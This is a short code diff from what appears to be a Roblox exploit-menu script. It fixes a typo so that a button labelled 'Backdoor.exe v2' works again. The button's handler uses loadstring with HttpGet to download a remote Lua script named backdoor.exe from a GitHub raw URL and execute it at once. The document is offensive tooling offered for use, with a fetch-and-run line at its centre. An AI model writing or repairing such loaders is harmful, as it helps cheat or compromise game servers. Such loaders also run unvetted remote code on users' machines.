@@ -88,6 +88,6 @@ BackdoorV2.Font = Enum.Font.SciFi
 BackdoorV2.Text = "Backdoor.exe v2"
 BackdoorV2.TextColor3 = Color3.fromRGB(0, 0, 0)
 BackdoorV2.TextSize = 14.000
-BackdooeV2.MouseButton1Down:connect(function()
+BackdoorV2.MouseButton1Down:connect(function()
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
 end)
